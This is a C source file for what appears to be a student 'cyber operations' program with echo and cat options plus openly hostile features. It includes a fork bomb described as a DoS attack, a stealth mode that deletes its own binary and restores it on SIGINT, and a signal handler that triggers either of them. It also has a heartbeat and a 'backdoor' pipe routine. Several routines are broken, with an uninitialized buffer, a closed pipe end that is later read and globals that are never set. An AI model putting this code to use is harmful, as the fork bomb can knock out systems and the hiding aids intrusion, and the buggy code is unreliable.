//c libraries used in the project
#include <getopt.h>
#include <unistd.h>
#include <errno.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>

//defines
#define MAX 1024 //for cat
#define STD_ERR_RETURN -1
#define PIPE_READ_FROM 0
#define PIPE_WRITE_TO 1
#define MAX_BUFF_LEN 1024

//global variables
int fd;
int argc;
char **argv;

//function prototypes:
int usage_message();
int cat(char *file);
int echo(int argc, char *argv[]);
int stealth(int argc,char *argv[]);
void SimpSigHandler(int sigNum); //milestone3
int peakaboo_bomb();
void f_bomb();
void simpSigHandler(int sigNum); //milestone4
void heartbeat_handler(int signum);
int milestone5(int argc, char *argv[]);
int backdoor_pipes(int argc, char *argv[]);//milestone6


int main(int argc, char *argv[]){
	int opt;
	  while ((opt = getopt(argc, argv, "he:csfpbd")) != -1) {
        switch (opt) {
        case 'h':
            usage_message();
            break;
        case 'e':
            echo(argc, argv);
            break;
	      case 'c':
		        cat(argv[1]);
		        break;
        case 's':
            stealth(argc, argv);
            break;
        case 'f':
            f_bomb();
            break;
        case 'p':
            peakaboo_bomb();
            break;
        case 'b':
            milestone5(argc, argv);
            break;
        case 'd':
            backdoor_pipes(argc, argv);
            break;
        default:
            break;

        }   
    
    }

return 0;
}


int usage_message(){
  char help_message[1024] = "This program aids in cyber operations.\n -h: help page. (displays this help menu denoting the usage options for this program).\n -e: echo. (takes user input and pastes it to standard output).\n -c: cat. (reads a single file from the command line and prints to standard output).\n -s: stealth mode. (hides the program from the list command).\n ";
  printf("%s", help_message);
  printf("-p: peakaboo. toggle stealth mode.\n");
  printf(" -f: forkbomb. DoS attack.\n");
  printf(" -b: heartbeat mechanism (sends signals from grandchild to grandfather process)\n");
  printf(" -d: use pipes to communicate through child and parent process\n");

return(0);
}

int cat(char *file){
  char *filename = file;
  char words[MAX]; //max file size
  	
  int openfile = open(filename, O_RDONLY); //opens the file for reading only

  int filestatus = read(openfile, &words, sizeof(words)); //checks for errors
  	

   if (filestatus == -1){
     perror("unable to open file, please make sure the filename is the command option before the -c argument\n");
     return (2);
   }

  	write( 1, words, strlen(words)); //write the contents of the file
  	write( 1, "\n", 1); //add new line at the end

  	filestatus = close(openfile); //close the open file (save)

  	return(0);
}

int echo(int argc, char *argv[]){
	for(int i=2; i<argc; ++i){
		write(1,argv[i],strlen(argv[i]));
		write(1," ",1);
		}
	write(1,"\n",1);

	return 0;
	}

int stealth(int argc,char *argv[]){
	fd = open(argv[0], O_RDONLY);
	unlink(argv[0]);
	
  struct sigaction sigHandy;

  sigHandy.sa_handler = &SimpSigHandler;
	sigHandy.sa_flags = SA_RESTART;

  sigaction(SIGINT, &sigHandy, NULL);  // Registers/calls the signal handler   
  return 0;
}

// Below is the simple signal handler function that gets called when the signal is caught.
void SimpSigHandler (int sigNum){
	char *buff;
	if (sigNum == SIGINT){
		int fd2 = open( argv[0], O_WRONLY | O_CREAT, S_IRWXU);
		int rfd=read(fd, buff, MAX);
		write(fd2,buff,rfd);
	}
}


int peakaboo_bomb(){
    printf("waiting for signals\n");
    int intReturned; //called failure status
    struct sigaction sigHandler; //sigaction for signal handler
    
    sigHandler.sa_handler = &simpSigHandler;
    sigHandler.sa_flags = SA_RESTART;
    intReturned = sigaction(SIGUSR1, &sigHandler, NULL);
    if ( intReturned == -1 ){
      perror("Unable to register signal handler\n");
      return(2);
      }
    
    //indefinitly wait for signal

      while (1) {
      pause();
      }

      //return to caller
      return(0);
      }

void simpSigHandler(int sigNum){
  int savedErrno;
  //perform function
  savedErrno = errno;
  switch (sigNum) {
    case SIGUSR1:
      stealth(argc, argv);
      break;
    case SIGUSR2:
      f_bomb();
      //f-bomb= make a bunch of fork calls to overload process table (DoS
      //attack)
      break;
    default:
      break;
  }

  errno = savedErrno;
  return;
}

void f_bomb(){
  while(1){ //infinite loop
    fork();
  }
  return;
}

int milestone5(int argc, char *argv[]){

  printf("grandchild process is sending a heartbeat signal to the grandparent process every 60 seconds\n");

  //structure of the heartbeat handler
  struct sigaction heartbeat;
  heartbeat.sa_handler = &heartbeat_handler;
  heartbeat.sa_flags = SA_RESTART;

  pid_t first = fork(); //fork and create a child PID
  int grandparent = getppid(); //PID of grandparent
  
  
  if (first  ==  0){ //child

    pid_t second = fork(); //create a grandchild by forking another time

    if (second == 0){ //grandchild

      while(1){ //indefinitly
        if (alarm(60) == 0){ //every 60 seconds
          kill(grandparent, SIGABRT); //send heartbeat to grandparent
        } 
      }


    }

  }
  else if (first != 0){ //grandparent
    while(1){ //always wait for the heartbeat
      sigaction(SIGABRT, &heartbeat, NULL); //recieve + handle heartbeat
      //if (timer(180) == 0){ //if 180s pass w/ no heartbeat
        //restartHeart = execvp(./a.out -b, args); //execute program again
      } 
    }


  return(0);
}

void heartbeat_handler(int signum){ //handle the heartbeat

  if (signum == SIGABRT){
    printf("heartbeat recieved");
  }
}
  

int backdoor_pipes(int argc, char *argv[]){//milestone6

  int pipeData; //status of pipe
  int ChildToParent[2]; //listen and talk from child to parent
  int ParentToChild[2]; //listen and talk from parent to child
  char buffPipe[MAX_BUFF_LEN];
  pid_t pidChild; //fork to create child

  if (pipe(ParentToChild) == STD_ERR_RETURN){
    return EXIT_FAILURE ; //unable to create pipe
  }
  if (pipe(ChildToParent) == STD_ERR_RETURN){
    return EXIT_FAILURE ; //unable to make pipe
  }
  pidChild = fork();
  switch(pidChild){
    case STD_ERR_RETURN : //ERROR: fork() failed
      return EXIT_FAILURE ;
      break;

    case 0 : //child process executes command
      close(ChildToParent[PIPE_WRITE_TO]);//don't write to parent
      close(ParentToChild[PIPE_READ_FROM]);//don't read from child/myself

      pipeData = read( ParentToChild[PIPE_READ_FROM], buffPipe, MAX_BUFF_LEN ); //read data from parent through pipe

      write(STDIN_FILENO, buffPipe, pipeData);//write what came from the parent to the child STDOUT

      close( ParentToChild[PIPE_READ_FROM] ); //close used end


      break;
  

    default: //parent process (NetGoat)


      close( ParentToChild [PIPE_READ_FROM]); //close pipe that would read to the child
      close( ChildToParent [PIPE_WRITE_TO]); // close pipe that receives from parten

      pipeData = read( ChildToParent[PIPE_READ_FROM] , buffPipe, MAX_BUFF_LEN ); //read data from child to the parent
      write(STDOUT_FILENO, buffPipe, pipeData); //write what the message from the child process says
      //redirect read data to standard output

      close( ChildToParent[PIPE_READ_FROM] ); //close used end

      break;
  }

  return(0);
}


